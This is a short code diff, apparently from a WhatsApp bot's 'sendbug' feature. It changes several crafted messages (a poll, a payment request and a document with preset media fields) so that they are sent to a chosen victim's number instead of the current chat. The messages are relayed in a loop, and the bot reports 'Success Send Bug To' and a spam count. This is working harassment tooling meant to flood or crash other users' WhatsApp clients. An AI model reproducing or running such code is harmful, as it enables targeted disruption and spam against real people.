@@ -643,7 +643,7 @@ var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject
 ],
 "selectableOptionsCount": 5
 	}
-}), { userJid: m.chat, quoted: doc })}
+}), { userJid: bwa, quoted: doc })}
 XeonBotInc.relayMessage(bwa, pollCreation.message, { messageId: pollCreation.key.id })
 deploy('Successful sendbug')
 }
@@ -674,7 +674,7 @@ var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.from
 "extendedTextMessage": {
 "text": botname,
 }
-}}), { userJid: m.chat, quoted: doc})
+}}), { userJid: num, quoted: doc})
 XeonBotInc.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
 }
 m.reply(`Success Sending Bug To: ${num}\nAmount Spam: ${jumlah}`)
@@ -733,7 +733,7 @@ let bwa = q.split('|')[0]
 let jumlah = q.split('|')[1]
 if (jumlah >= 5) return reply(`spam`)
 for (let i = 0; i < jumlah; i++) {
-var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({	
+var document = generateWAMessageFromContent(bwa, proto.Message.fromObject({	
 "documentMessage": {
 "url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
 "mimetype": "",
@@ -746,7 +746,7 @@ var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
 "mediaKeyTimestamp": "1658703206",
 }
-}), { userJid: m.chat })
+}), { userJid: bwa })
 XeonBotInc.relayMessage(bwa, document.message, { messageId: document.key.id })
 }
 m.reply(`Success Send Bug To: ${bwa}\nAmount Spam: ${jumlah}`)
